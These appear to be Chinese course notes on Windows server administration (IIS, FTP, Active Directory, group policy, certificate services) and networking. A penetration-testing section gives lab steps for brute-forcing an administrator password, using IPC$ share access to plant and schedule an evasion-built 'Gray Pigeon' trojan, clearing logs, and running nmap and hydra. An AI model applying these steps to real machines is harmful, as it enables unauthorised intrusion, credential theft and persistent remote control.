WEB服务器​\tweb服务器也称为网页服务器或HTTP服务器，为什么也称为HTTP服务器？因为WEB服务器使用的协议是http或https（安全）;\n​\thttp协议端口号：TCP 80;    https协议端口号：443，FTP协议端口号：21\n7.1 服务器发布软件​\t微软：​\t\t1）IIS (internet infomation service)：可以发布web网站和FTP站点​\t\t2）linux：Apache、LAMP、Tomcat、nginx。。。\n​\t\t微软的适合生产环境的使用\n​\t第三方：phpstudy、XAMPP、。。。\n​\t\t适合测试环境\n7.2 部署WEB服务器​\t1）配置静态ip地址​\t2）安装IIS-WEB插件​\t安装完之后，会生成一个默认的web站点，该站点的文件存储在 C:\\Inetpub下的俩个root结尾的文件：web服务是wwwroot，ftp服务是ftproot；\n​\t注意：一般服务器上不用的服务最好停止，谨慎删除\n配置步骤：    1）在菜单网站上右键，新建    2）填写描述：该网站在服务上的名称    3）设置网站ip地址：因为一台服务器上可能存在多张网卡，获取到多个ip，因此需要指定某一个具体的ip    4）设置端口：默认 80    5）输入主目录的路径：web服务的静态网页存放的文件夹    6）勾选下方的允许匿名访问（important）    停用默认站点\n注意：当以上的步骤完成之后，并不能访问到我们写的静态网页index.html          原因：            1）若是我们没有完成上述步骤（6）意味着访问该ip的时候需要我们输入账户和密码，因为在我们安装完该服务之后，该服务会默认在本机上创建一个账户用于访问该服务的网站，若是勾选了匿名访问，则无需我们输入密码，会自动给用户使用该账户访问服务器资源。            2）若是勾选了匿名访问服务，访问资源的时候可能会出现无权查看的情况，这时候的问题可能是我们文件夹的权限问题（一般只要没有主动修改权限的话，一般不是这个问题）；还有一种情况是，在我们创建的网站上右键—-选择上面的文档菜单，其中有一个启用默认文档的选项，里面记录了我们通过ip访问web资源时默认展示的网页，里面不存在我们刚创建的静态网页index.html,只有index.htm,因此出现访问不到情况。并且在启用默认文档的内容中，越靠上，优先级越高，从最上层一个一个往下找，直到找到存在的页面，否则无法显示。\n注意：\n​\t1）每当在web服务器上新建一个网站时，每个网站都需要绑定一个ip和端口号，若是当前网站使用ip和端口被之前的网站占用了，此时只要换一个端口就行了（最好使用1024以后的端口），ip可以重复，但是的端口不行；或者也可以重新装一块网卡换个ip。​\t2）或者也可以使用相同的ip相同的端口号，但是使用主机头值，这要求不仅需要ip:端口号正确配对，网站上输入的域名也需要和网站中设置的主机头值配对成功才能访问，一般通过www.xin.com访问也不需要带端口，因此实际只需要DNS能够正确解析该域名，且www.xin.com与设置的主机头值相同即可，**并且主机头值在新建网站的时候就能设置，选项为此网站的主机头**，但是设置了主机头值之后，就不能使用ip访问了​\t3）若是在设置了主机名之后，想不仅能通过主机名访问网站资源，同时使用ip也能访问，那么可以在文档—-网站选项—-高级里面的网络标识中多添加几套规则，比如可以添加一个不加主机头值的网络标识，那么此时就可以通过ip:端口号访问网站资源了\n​\t总结：​\t\t一台服务器同时发布多个web站点的方式：​\t\t1）不同的ip，相同的端口​\t\t2）相同的IP，不同的端口​\t\t3）相同的IP，相同的端口，不同的域名（主机头值）​\t\t前俩种方式在测试环境种使用的最多，第三种方式在生产环境中使用的最多\n7.2.1主机头值​\t在对应创建的网站上—-右键—–选择网站菜单—–点击网络标识中的高级选项—-选中我们配置的ip地址和端口—–点击编辑—-设置主机头值​\t设置完成之后，后面访问该网站的资源不仅需要ip:端口配对正确，并且在网站上输入的域名也需要和设置的主机头值匹配正确\nTips:在服务器上申请第二个ip的操作​\t我的网络—-属性——ip地址——高级——添加ip和子网掩码—-完成​\t通过 ipconfig 命令可以查看到当前连接有俩个ip地址\n7.2.2网站类型​\t1）静态网站：一般扩展名为.html或.htm；这种网站无法和数据库进行交互的​\t2）动态网站：一般扩展名为.asp或.php；这两者是一种语言，有后台数据库,asp或php可以连接前台页面与后台数据库​\t\t\t若是需要使用动态网站比如.asp，需要在部署服务的时候（也就是创建网站的最后一步）设置此网站的访问权限，一般默认是读取，若是需要使用asp，则必须额外勾取运行脚本（如ASP）以及执行（如...）,并且需要在web服务扩展中将Active Server Pages设置为允许\n7.2.3访问网站根目录下的子文件夹​\t在相应的网站上右键属性——-选择菜单主目录—-下面有个配置的菜单，点击——-弹出的界面的上方菜单有个选项，点击—–勾选启用父路径​\t这样就可以访问根网站根路径下的子文件夹\n8 FTP服务器​\tFile Transfor Protoco:文件传输协议；端口号：TCP 20&#x2F;21\n8.1ftp的工作方式（Important）​\t具体选择哪种工作方式，是由客户机决定的，但是站在服务器的角度，主动模式是服务器主动，被动模式是服务器被动\n​\t1）主动模式：一般该模式下会启用两个端口号：20和21：21端口为控制端口，20为数据端口。​\t\t\t\t当客户机连接服务器时，此时客户机会打开端口号50001同时发送请求——需要连接（此时由客户机决定使用主动模式，还是被\t\t\t\t动模式）——&gt;服务器​\t\t\t\t此时服务器会通过21端口发送请求——-询问账号密码———–&gt;客户机​\t\t\t\t客户机发送账号密码—————-&gt;服务器​\t\t\t\t服务器验证账号密码通过之后发送请求——————&gt;客户机​\t\t\t\t客户机打开50002端口发送请求下载文件—————-&gt;服务器​\t\t\t\t服务器打开20端口，并主动连接客户机50002端口——————&gt;客户机（主动模式）​\t\t\t\t此时若是客户机开启了防火墙，则意味着服务器无法连接客户机，因此此时需要：​\t\t\t\t客户机50002端口主动连接服务器20（不一定是20，被动模式下，该端口是随机的）端口，防火墙只会拒绝主动连接，不会连接被动回信息，​\t\t\t\t此时由于是客户机主动连接服务器，因此称为“被动模式”，一般由于大家都会打开防火墙，因此一般都是使用被动模式\n​\t\t\t\t注意：一旦数据传输完，50002 和 20 端口号就会关闭\n​\t2）被动模式：21端口+随机端口作为数据传输端口\n8.2ftp服务器的搭建​\t和web服务的搭建类似，只是不需要绑定 域名以及额外添加了一个全新设置–FTP权限\n​\t步骤：​\t\t1）配置静态ip​\t\t2）安装IIS-FTP软件​\t\t3）和web网站搭建步骤基本一致​\t\t4）去掉匿名访问\n​\t注意：​\t\t1）权限设置和之前的NTFS权限与共享权限的规则一样，都是取交集，即FTP权限与NTFS权限的交集，所以和之前一样将FTP权限设置为完全控制，即勾取 读取 和 写入​\t\t2）最好新建一个用户用于他人访问本机的FTP资源，因为FTP一般都是匿名访问\n8.3 ftp服务器软件介绍​\t1）Slyar FTP server:  体积小，但是不稳定，人多容易崩溃​\t2）Server U：稳定性强，适合在生产环境中使用\n​\tServer U中多个用户共享单个个文件夹的方式：​\t\t1）新建该共享文件夹—–不建在多个用户组的文件夹中​\t\t2）在服务器的最上层有一个设置的菜单选项—-选择虚拟路径选项​\t\t3）填写需要映射的文件夹的物理路径​\t\t4）映射物理路径到——%HOME%：该路径代表多个用户的ftp家目录​\t\t5）填写映射路径名称——显示在别的用户的文件目录中的名称​\t\t6）最后为每个用户的账号中添加这个目录即可（若是不进行上面的操作，直接添加目录不会起作用）\n9.域（Domain）9.1内网环境​\t\t1）工作组：默认模式，普遍模式，一般人都属于这个组，特点就是人人平等，但是不方便管理​\t\t2）域：特点，人人不平等，但是可以实现集中管理，统一管理\n​\t域的特点：集中&#x2F;统一管理\n9.2域的组成​\t1）域控制器（DC:Domain Controller）​\t2）成员机\n9.3域的部署​\t准备工作：​\t\t1）安装域控制器—–就会生成域环境​\t\t2）安装了活动目录—–就生成了域控制器​\t\t总结：想要生成域环境，就必须安装活动目录；也就是说，域的部署其实就是安装活动目录​\t\t活动目录：Active Directory（AD），其特点是能实现集中管理&#x2F;统一管理；和域的特点一致，因为域的功能是通过活动目录完成的\n​\t活动目录的部署：​\t\t1）开启2008虚拟机并桥街到vmnet2​\t\t注：一般安装服务器的步骤（此处不使用这种安装）：在计算机上右键—–管理—-里面有个角色：也就是服务器—–右边有个添加角色：对应就是添加服务​\t\t2）配置静态ip(作为DC,只需要配置ip和子网掩码即可)​\t\t3）win + R —- 输入 dcpromo   :该命令有俩个作用，安装或卸载活动目录​\t\t4）在弹出的界面中—–不使用高级模式安装——下一步到选择在此计算机上安装DNS服务（即作为DC也作为DNS）—–下一步到 选择在新林中新建域——-设置FQDN,该名称即代表第一个域的名称也代表第一个林的名称——–选择林功能级别（一旦选择了某个系统，则将来在该林中的其它域控制器的系统版本不能低于该系统）——–选择域功能级别（一旦选择某个系统，则意味着该域内的DC系统版本不不能低于该系统版本）—–一直下一步即可（出现警告直接是）—–设置密码（活动目录的还原密码，对整个域进行还原操作）—–一直下一步直到重启​\t\t5）登陆域：之前的本地账户自动被迁移到活动目录中了，意味着该账户为DC账户，本地管理员升级为域管理员\n注：    1）计算机右键—–属性—–查看当前所属域    2）在DNS中可以看到自动创建了一个A名称指向DC    3）查看Active Directory 用户和计算机，其中记录了DC以及之前本地的组；将之前本地用户和组中的信息迁移到活动目录中，变为域账户和域组    其中computer：存放本地域成员机列表            Domain Controller：DC列表            Users：域账号\n​\t本地账号和域账号登陆的区别：​\t\t1）使用本地账号登陆只能使用本地资源，使用域账号登陆能使用本地资源和域资源\n加入域：（前提配置ip以及将dns指向DC）我的电脑—–右键属性—–选择上面菜单中的计算机名—–更改—-选择隶属于域：填写加入域的名称（此时会向DNS解析该名称）—-输入有加入该域权限的账户和密码（建议使用域管理员的账户DC）账户格式：xin.com\\administrator，win7可以不用写前面的xin.com-—-欢迎加入域！注意：加入域之后，每次访问域资源都需要使用域账号，之后该域账号会被发送到DC进行校验，这之间的通信过程遵循LDAP（Light Directory Access Protocol）协议\n普通用户加入域之后，都需要使用按三见进如系统，且在登陆界面有个选项按钮，该选项可以选择登陆域（使用域账号）还是登陆本地（使用本地账号）域账号的创建：：在DC上的活动目录Active Directory 用户和计算机上的Users菜单中右键——新建——用户—–填写姓名（一般使用中文，自己的名字），填写登陆的用户账号和密码（登陆用户名一般使用英文）\n将域账号加入到某台电脑的管理员组中：    1）使用具有一定权限的域账号登入该电脑，在用户和组中将域账号添加到管理员组即可    注：一定是要有权限的账号登入，使用本地管理员账号登陆，在添加的时候还是会要输入域账户，因此需要有足够权限的域账户\n名词：    本地管理员组（administrators）&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 域管理员组（Domain Admins）\n9.4组织单位（OU：Organization Unit）​\t作用：用于归类域资源（域用户、域计算机、域组），方便查找以及管理\n​\t新建组织单位的步骤：​\t\t1）在活动目录中———最上层的OU上右键————新建组织单位———–设置名称即可（组织单位可以嵌套）\n​\t将某个域用户移动到某个组织单位：直接在该活动目录中找到该用户—–右键——所有任务——移动——-选择目标组织单位即可​\t注意：一般移动了域用户，其对应的电脑也需要移动到相同的组织单位，并且对用户做限制与对电脑做限制是两个不同的方向，只对域用户做限制，该限制是绑定域用户的，此时换电脑是没用的，若是只对电脑做限制，此时若用户换电脑，该限制不起作用。\n9.5组策略（GPO：Group Policy）​\t作用：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等\n​\t查看：在第一台DC上的管理工具中可以看到有一个组策略管理——打开即可查看所有OU的组策略，默认会有俩张，一张对整个域做限制，另一张对DC做限制\n​\t新建组策略：在组策略管理中，对着目标OU右键——-新建GPO表即可：当需要对该OU做限制时，直接修改该表即可（在该表上右键—-编辑即可修改）\n​\t策略的三种状态：​\t\t1）未配置：没有修改过​\t\t2）已启用：启动该策略​\t\t3）已禁用：禁用该策略​\t注意：若是需要访问DC上的文件，需要先在DC上创建一个共享文件夹，以便该域下的所有主机都能访问\n​\t（1）组策略在域中，是基于OU（组织单位）来下发的，并且组策略下发后，用户的应用顺序是：LSDOU​\t\tL：local​\t\tS：站点，涉及到林（一般没有）​\t\tD：domain 域中的组策略​\t\tOU：组织单位，距离最近的组织单位\n​\t组策略包括用户配置和计算机配置：​\t\t理论上，对用户进行配置，该用户注销后重新登陆，配置即可生效（不是绝对），若是对计算机进行配置，则需要重启电脑，配置才会生效\n​\t（2）查看配置组策略：​\t\t点击对应的组策略———-选择右边菜单中的设置———–添加、添加——–即可查看报告\n​\t（3）强制执行某个组策略：当组策略按顺序执行到该组策略后，后面的组策略就不再生效​\t（4）阻止继承：使得当前组策略之前的所有组策略不再生效​\t\t\t注意：上级对下级强制是对组策略右键—-强制；而下级对上级阻止继承是对OU右键—-阻止继承；当强制和阻止继承同时出现时，以强制为准\n9.6PKI9.6.1PKI概述​\t公钥基础设施：Public Key Infrastructure\n​\t作用：通过加密技术和数字签名保证信息的安全\n​\t组成：公钥加密技术、数字证书、CA、RA\n9.6.2信息安全三要素​\t1）机密性​\t2）完整性​\t3）身份验证&#x2F;操作的不可否认性\n9.6.3应用领域​\t1）SSL&#x2F;HTTPS​\t2）IPsecVPN​\t3）部分远程访问VPN\n9.6.4公钥加密技术​\t作用：实现对信息的加密、数字签名等安全操作\n​\t具体实现：加密算法​\t加密算法的分类：​\t\t1）对称加密算法：加解密的密钥一致；例如：DES、3DES、AES​\t\t2）非对称加密算法：通信双方各自产生一对公私钥；双方各自交换公钥；公钥和私钥为互相加解密关系 ；公私钥不可互相逆推；比如RSA、DH​\t\t\t\t实现过程，通信双方A,B各自生成公私钥（A的公钥：123，私钥：321；B的公钥abc，私钥：cba）;​\t\t\t\t此时双方交换公钥信息，此时A具有自己的公私钥和B的公钥三把钥匙，B具有自己的公私钥和A的公钥三把钥匙​\t\t\t\tA将发送给B的信息利用B的公钥abc用RSA算法加密得到T1（此时T1只有B能解开，满足机密性），并将加密后的密文通过不可逆算法hash算法再次加密得到T2，再将T2利用A的私钥321用RSA算法加密得到T3（T3也称为数字签名），最后将T1与T3共同发给B;​\t\t\t\tB收到信息后，将T1和T3取出，并利用A的公钥123对T3进行解密得到T2，同时同样利用不可逆算法hash算法对T1进行加密得到T2，比较俩次T2的值，若是内容被修改，俩次T2的值则不同（满足完整性），若一致，则使用B的私钥cba对T1进行解密得到信息。​\t\t\t\t非对称加密算法还是有一个漏洞：在最开始交换公钥的时候，不能保证对方收到的公钥一定是对方的​\t\t\t\t解决方式：启用大家都信任的第三方机构CA(证书颁发机构：用于颁发数字证书)，A需要在CA上进行注册（由RA完成），并注明自己的ip,公钥等信息，同时CA有自己的公钥666和私钥999，CA会将A的信息利用自己的私钥999加密形成签名（数字证书），然后颁发给A，当A与他人通信的时候，会自动带上这串签名。也就是说当B收到A的公钥时，可以利用B从CA中得到的公钥666对A的数字签名解密，判断两个公钥是否一致。若是A没有证书，双方也能正常通信，不过会提示不安全。​\t\tHash不可逆算法包括(用于验证完整性)：MD5、SHA\n​\t数字签名：用自己的私钥对摘要（将信息通过不可逆算法得出的密文）加密得出的密文​\t数字证书：用于保证公钥的合法性；遵循X.509标准；数字证书由权威公正的第三方机构即CA签发​\t\t\t\t其包含的信息：1）使用者的公钥值​\t\t\t\t\t\t\t\t\t\t 2）使用者的标识信息（如名称和电子邮件）\t​\t\t\t\t\t\t\t\t\t\t 3）有效期（证书的有效时间）​\t\t\t\t\t\t\t\t\t\t 4）颁发者的标识信息​\t\t\t\t\t\t\t\t\t\t 5）颁发者的数字签名\n9.6.5CA搭建​\t在安装IIS服务的时候，记得勾上应用程序开发，因为CA本身就是一个动态网页\n​\t注：在装好IIS后不要停用默认站点，因为后续CA会占用该默认站点发布自己的服务\n​\t安装CA服务：​\t\t1）和安装IIS服务一样，CA服务的名称为：Active Directory 证书服务  —  选择安装​\t\t2）下一步——直到为该证书服务安装角色服务——–额外勾选证书颁发机构Web注册​\t\t3）企业：域环境下； 独立：普通工作组环境（一般选这个）​\t\t4）选择根  —-  新建私钥—–选择加密算法（一般默认）——配置名称（设置CA名称）​\t\t5）设置CA有效期（一般默认）—–一直下一步直到安装即可（若是上面没有勾上应用程序开发），在此处也可以安装​\t\t注：一旦安装，该服务会占用IIS服务中的默认站点，作为CA服务网站\n​\tIIS服务获取申请证书：​\t\t1）点击IIS服务器的最上层服务器——右边服务种选择服务器证书 点击​\t\t2）在右边操作菜单中选择创建证书申请 —-填写基本信息（通用名称应该填写访问的网址的名称）—-下一步​\t\t3）选择加密算法（一般默认）—-下一步​\t\t4）为证书申请指定一个文件名—–选择保存路径以及设置文件名称—–申请证书文件完成（下一步就是将该申请证书提交给CA）\n​\t向CA提交申请证书：​\t\t1）打开CA服务网站 ： 10.1.1.2&#x2F;certsrv​\t\t2）点击申请证书——选择高级证书申请——-选择使用base64编码的.....​\t\t3）在第一个base-64的证书申请...的框中，将申请证书里面的内容复制进去​\t\t4）最后提交即可\n​\t打开CA机构，查看挂起的证书申请——-右键选择颁发即可\n​\t重新打开CA服务网站，选择查看挂起的证书申请的状态——–下载CA证书—–保存并设置名称\n​\t打开IIS服务器，准备导入证书：​\t\t1）点击IIS服务器的最上层服务器——右边服务种选择服务器证书 点击​\t\t2）在右边操作菜单中选择完成证书申请​\t\t3）在指定证书机构颁发的响应中选择刚刚保存的CA证书，起一个好记的名称—–确定即可\n​\t将提供的web服务，升级成https服务：​\t\t1）选择相应的web站点——右键——-编辑绑定​\t\t2）右边菜单选择添加——类型选择https——其余不变（不需要设置主机名，因为会延用之前http的主机名）​\t\t3）选择SSL证书—–选择刚配置的CA证书；此时用户即可用http访问也能用https访问​\t\t4）让用户只能https访问：选择相应的web站点——右边菜单中选择SSL设置——勾选要求SSL​\t\t\t\t注：下面的客户证书的选项的含义：忽略：不需要客户机有证书； 接受：客户机有没有证书都行； 必须：客户机一定要有证书​\t\t5）应用即可​\t\t注：在访问过程中，会出现证书不安全的提示，这是正常的，说明证书已经颁发成功，而出现该提示的原因是颁发证书的机构不是受信任的权威机构，若是要解决这个问题，需要在internet选项中，将我们自己搭建的CA机构证书导入进去即可（CA证书可以通过web服务上下载）\n​\t\t额外小实验：将客户证书的选项选择为：必须；  这就意味着，不仅服务器需要证书，用户也需要证书​\t\t1）登陆CA的web服务器网站——-申请证书——-申请web浏览器证书——-填写好信息后​\t\t2）在CA服务器上给该浏览器颁发证书​\t\t3）使用该浏览器登陆CA的web服务查看挂起证书—–安装证书即可\n10 综合测试（所有机子还原快照，重新配置）10.1 测试1\n1）配置DHCP时出现问题​\t\t需要使用DC账户登陆该服务器，并对该服务器进行授权\n2）配置HTTPS服务：​\t\tHTTPS的端口号：443​\t\tHTTP的端口号: 80\n3）权限问题​\t\tOU是没有权限的，权限是靠组管理的\n4）生产环境中（important）​\t\t需要在DC的DNS服务器上，右键—–属性——设置转发器（将内部DNS转发到真实有效的DNS）(不设置的话，dns也内置了根服务器，可能会比较慢)\n5）赋予权限​\t\t为了集中赋予权限，可以在OU下创建新的组：​\t\t创建过程中遇到的名词：​\t\t\t1）组作用域：​\t\t\t\t\t\t本地域：只在当前域中生效（林中其它域不会生效）​\t\t\t\t\t\t全局：当前林中所有的域都生效​\t\t\t\t\t\t通用：作用域和全局一样，只是选择改选项会使得当前域对赋予权限的组进行缓存，提高解析速度；一般不使用\n​\t\t\t2）组类型：​\t\t\t\t\t\t安全组：一般的权限控制​\t\t\t\t\t\t通讯组：主要用于发邮件​\t\t\t\t\t注意：若是改组同时需要赋予权限以及发邮件，那就需要创建俩个组（安全组和通讯组）\n6）用域账户登陆​\t\t\t可以直接使用 用户名@域名\n7）非匿名访问服务器Web服务​\t\t\t非匿名访问意味着访问该服务时需要输入账号密码，此时需要在wen服务上右键——属性——目录安全性—–编辑省份验证和访问控制——–用户需进行身份验证——–选择 windows域服务器的摘要式身份验证——-选择领域——选择所属领域即可\n10.2 测试2\n\n1)文件共享服务​\t只能通过域名访问共享文件夹，不能通过ip访问\n2）CA的web服务也必须用域名访问3）证书的申请​\t证书模板记得勾选web服务器\n4）当需要配置多个HTTPS服务而需要导入多个证书​\t\t由于每个站点对应的证书不同，服务器需要通过请求中不同的主机头来判断需要用哪个证书解密，然而主机头作为请求的一部分也被加密。最终IIS只好使用第一个绑定到该IP：PORT的站点证书解密请求，从而有可能造成对于其他站点的请求失败而报错。\n​\t（1）为多个HTTPS服务设置不同的主机名​\t\t\t部分IIS配置HTTPS无法配置主机名，此时要么升级IIS,要么通过IIS的配置文件来配置主机名（百度）​\t（2）为多个HTTPS服务配置不同的ip,之前有介绍过​\t（3）在申请证书的时候，通用名称使用通配符，这样可以将一个证书分配给多个HTTPS服务\n5）使用组策略时​\t若是要提供资源，如桌面背景图，应提前在DC上建立共享文件夹，以便所有人能访问下载\n6）设置用户登陆执行脚本的组策略​\t需要把脚本复制到指定的文件夹中，在组策略中—-脚本—–登陆脚本—–添加—–浏览就能看到该路径\n11渗透测试流程：0）授权（important）    1）信息收集：nslookup、whois    2）扫描漏洞：工具nmap：ip范围、端口等；接着高级扫描：如IIS漏洞，再接着扫描网站漏洞（十大漏洞）    3）漏洞利用    4）提权（shell环境、桌面环境、最高权限）    5）一系列操作之后，毁尸灭迹（清除日志）    6）留后门    7）渗透测试报告\n例子：攻击服务器的445端口（共享服务）&#x3D;&#x3D;&#x3D;&#x3D; windowsXP   攻击   windows2003​\t\t1）xp上安装漏洞扫描小工具：scanPort​\t\t\t\t也可用手动使用命令 telnet + ip + 端口  ： 测试目标是否打开了这个端口；telnet不仅可用于远程登陆，也能用于探测端口​\t\t2）此例子主要利用445端口漏洞之一：**IPC$**；使用的命令 net use\n#net use 使用例子：net use f: \\\\10.1.1.3\\share 123.com /user:administrator  #作用：将10.1.1.3的共享文件夹映射到本机的f盘，中间共享文件夹可用一些隐藏的共享文件夹，比如 c$,IPC$等net use    #显示映射列表#删除映射的盘符net use f: /del   #删除某条net use * /del   #删除全部#注意使用上诉命令，只在此次登陆有效，下次登陆就会失效，若要永久保存，则：在 我的计算机  -- 右键  ----- 映射网络驱动器 ----- 选择登陆时连接----选择用户连接 ---- 输入暴力破解出的账号密码----- 然后按要求填写即可#映射IPC$net use \\\\10.1.1.3\\IPC$ 123.com /user:administrator   #不映射盘符，然后就可以随意对对方电脑做操作dir \\\\10.1.1.3\\D$     #查看对方电脑D盘中的目录#之前所学的所有命令，只要带路径的都可以改成 远程路径#留后门1）使用木马工具：灰鸽子牧民战天免杀专版2）打开程序-----选择配置服务程序------安装选项 中选择该木马在对方主机的安装目录-----启动项设置 中设置是否写入注册表，以及是否当成服务启动并设置服务名称及描述-----选择 自动上线设置  设置本机ip  接着生成服务器3）最后将生成的服务器通过 IPC$ 拷贝到对方电脑上\t想要在对方电脑上运行该服务：\t通过定时任务：at 命令：制作定时任务  、  net time \\\\10.1.1.3 查看对方电脑的时间\t（1）at \\\\10.1.1.3 11:19 &quot;c:\\windows\\system32\\heihei.exe&quot;  #制订定时任务，11：19为时间，双引号中的为服务程序\t（2）at \\\\10.1.1.3     #查看对方电脑中的定时任务，若任务执行了，则显示空\t（3）接着打开 灰鸽子牧民战天免杀专版 程序，左边有一个 自动上线主机 ---点击即可查看被种木马且上线的主机\n\n​\tTips：一般可以将电脑的管理员账号名称administrator进行修改，可以改成guest，将guest改成administrator，这样别人一般都会将管理员账号默认为administrator然后进行密码破解，而经过上诉调换之后，即使密码被暴力破解了，也只是一个权限不足的guest​\t\t3）为了能够使用net use进行盘符映射，需要知道目标账号和密码，账号可以默认使用 administrator(大多人不会改)，密码则进行暴力破解（远程破解）​\t\t注：为什么登陆IPC$，因为其是一个空链接，没有对应任何一个盘，只要我们登陆了IPC$，那我们可以使用对方主机的所有盘\n11.1扫描工具nmap​\t扫描器之王，一般内置在kail系统中，也有windows版本的，只不过不稳定\n​\t常用参数：\n\nnmap -sP 10.1.1.1/24   #扫描整个网段nmap -O 10.1.1.1    #探测主机Ip为10.1.1.1所使用的系统版本，同时会给出该主机上哪些端口打开了nmap -p 21,23 10.1.1.1   #探测主机是否开启21,23端口号,或者使用  23-25,后面的地址可以使用网段namp -p 21,23 10.1.1.1 -sV   #不仅查看端口是否开放，同时查看开放的端口运行的软件的信息（是windows还是linux）namp -A 10.1.1.1   #全面扫描，显示非常详细的信息namp -O 10.1.1.1 -oN d:\\baogao.txt \t\t#查看主机的系统版本，同时将信息保存到d盘下的baogao.txt文件中\n\n11.2爆破工具hydra​\t用于爆破的工具，也是内置在kail系统中的，也有windows版本\n#windows电脑上hydra.exe -l administrator -P e:\\pass.txt 10.1.1.1 telnet   #暴力破解主机管理员的账号，并登陆telnet,其中pass.txt为密码字典，中间参数p的作用：大写P:后面跟上密码字典； 小写p:后面直接跟管理员密码；前面账号前的l参数也是一样的：小写l:填写确定的账号名； 大写L：使用账号字典最后面还可以加上参数 -vV  :可以显示爆破的详细过程，不过windows版不太好用常用的服务的名称：445 ： 共享服务，名称：smb3389：远程桌面服务  名称：rdp21：ftp  名称：ftp23：telnet  名称 telnet\n\n11.3回顾学过破解密码方法#本地破解1.利用PE系统破解密码2.利用5次shift破解系统密码4.使用 getpass 工具：使用该工具得前提是得登陆该电脑，该工具可以将登陆时缓存在内存中得密码找出5.利用SAM值，进行暴力破解；使用工具&#x27;QuarksPwDump&#x27;提取本地SAM值，接着使用工具&#x27;SAMInside&#x27;进行暴力破解#远程破解3.远程爆破：namp:扫描是否在线且是否开启相应端口\t；NtScan 或者 hydra:进行账号密码爆破\n\n12OSI七层模型​\tOpen System Interconnection(OSI)：开放系统互联\n​\t在OSI七层参考模型问世之后，出现了TCP&#x2F;IP五层协议栈（将七层模型中的应用层、表示层和会话层合并在一层，通称应用层）\n​\t分层的思想：复杂问题简单化；下层为上层提供服务；同层使用相同的协议\n12.1TCP&#x2F;IP五层协议栈1）应用层：​\t\t\t\t提供源端口和目标端口；​\t\t\t\t应用层中的表示层用于将数据转化为二进制；​\t\t\t\t会话层用于管理会话数据，维持会话秩序​\t\t\t\t代表设备：PC，防火墙​\t\t\t\t协议：HTTP（80），HTTPS（443），SSH（22），Telnet（23），FTP（20&#x2F;21），DHCP（67&#x2F;68），SMTP（25），POP3（110），RDP（3389），SMB（445），Mysql（3306），DNS（53）\n2）传输层：​\t\t\t\t选择TCP&#x2F;UDP传输，加上TCP&#x2F;UDP头；​\t\t\t\t完成进程与进程之间的通信；输出的数据称为数据段（fragment）​\t\t\t\t代表设备：防火墙​\t\t\t\t协议：TCP，UDP（应用层数据流向传输层后，这俩个协议必须二选一（应用层数据预先就选择好了））\n​\t\t\t\t应用层所列出的协议中:​\t\t\t\t\tDNS的53端口既使用TCP也使用UDP：在客户机与服务器之间通信使用UDP，服务器之间通信使用TCP（备份操作）;​\t\t\t\t\tDHCP的67&#x2F;68端口均使用UDP;​\t\t\t\t\tSMB的445端口，既使用TCP也使用UDP;​\t\t\t\t\t其余协议均使用TCP;\n3）网络层：​\t\t\t\t加上IP包头：源ip和目标ip；​\t\t\t\t完成点到点之间的通信；输出数据称为报文或包或IP包(package)；路由器工作在这一层​\t\t\t\t代表设备：路由器​\t\t\t\t协议：ICMP（ping命令使用的协议），IP，ARP（传输层数据流向网络层后，必须使用IP协议，因为只有IP协议才能封装IP包头）​\t\t\t\tICMP协议与IP地址有关，ARP协议与MAC地址有关\n（1）IP包头结构：最小长度20字节（不包括可选项），可选项最大可达40字节，因此IP包头最大长度可达60字节\n​\t\t\t\t1）版本：4个bit，表示是 ipv4 还是 ipv6​\t\t\t\t2）首部长度：4个bit，转化为10禁止最大为15，每个数字单位为4个字节，因此15可以代表 15 * 4 &#x3D; 60字节​\t\t\t\t3）优先级与服务类型：8个bit，前三位代表优先级，中间四为代表服务类型，最后一位没有启用​\t\t\t\t4）总长度：16bit，包头长度加上四五层数据的总长度，即三四五层数据的总长度​\t\t\t\t5）标识符：16bit，发送端随机生成的，用于标识同一个分片数据​\t\t\t\t6）标志：3bit，第一个bit没有启用，为0；第二个bit用于标识是否分片，为0代表进行了分片，为1则没有分片；第三个bit用于\t\t\t\t\t\t\t\t标识当前分片是否为最后分片；为1代表还有后续分片，为0则代表当前分片为最后分片​\t\t\t\t7）段偏移量：13bit，当数据长度超过1500后需要分片，段偏移量用于区分分片后的片段顺序​\t\t\t\t8）TTL：Time To Live 生存时间；8bit，最开始会初始化一个值，一般windows在100往上，linux一般在100往下，在传输期\t\t\t\t\t\t\t\t间，每经过一个路由器，该值都会减1，当减到0，这个包就会被丢弃，防止该包在互联网上永久循环下去。​\t\t\t\t9）协议号：8bit，识别上层协议，tcp&#x2F;udp&#x2F;icmp；若值为6则流向tcp；17则流向udp；1则流向icmp​\t\t\t  10）首部校验和：16bit，校验首部20字节​\t\t\t  12）源地址：32bit，发送端ip地址​\t\t\t  13）目标地址：32bit，接收端ip地址​\t\t\t  14）可选项：0-40字节，一般不会启用\n–路由：​\t\t跨越从源主机到目标主机的一个互联网络来转发数据包的过程；​\t\t\t\t选择路径的过程称为路由（通过路由表完成）；​\t\t\t\t一旦某条线路的断开或损坏，与该网线的端口有关的路由条目都会动态消失；​\t\t\t注意：路由器只路由单播数据，不会路由广播\n\n​\t\t一旦给路由配上ip，且手动no shutdown 后，路由器中的路由表就会自动形成俩条路由条目&#x2F;路径条目(路由器一般有俩接口)：​\t\t\t\t1）C\t10.1.1.0&#x2F;24\tF0&#x2F;0 ；网段 + 对应接口；开头的 C（connected） 代表直连​\t\t\t\t2）C\t20.1.1.0&#x2F;24\tF0&#x2F;1​\t\t\t\t注意：一定要配好ip，以及接口为up状态;​\t\t\t\t\t\t\t一旦路由表中没有ip包中的目标ip地址的网段，则该数据包直接丢弃，且回发失败及原因​\t\t\t\t因为路由表只会自动生成与其直连的路由信息，因此其它路由信息需要我们手工配置：​\t\t\t\t3）S\t70.1.1.0&#x2F;24\tF0&#x2F;1;\tS表示static，一般为手动配置；第一种写法（实际一般不这么写）​\t\t\t\t\t  S\t70.1.1.0&#x2F;24\t20.1.1.2（下一跳IP地址)\t\n​\t\t\t\t4）S*\t0.0.0.0&#x2F;0\t20.1.1.2\t：前面的 S* 表示手动配置的默认地址；边缘路由适合配置：如上图的10、70、50​\t\t\t\t5）S\t40.1.1.1&#x2F;24\t20.1.1.2​\t\t\t\t\t 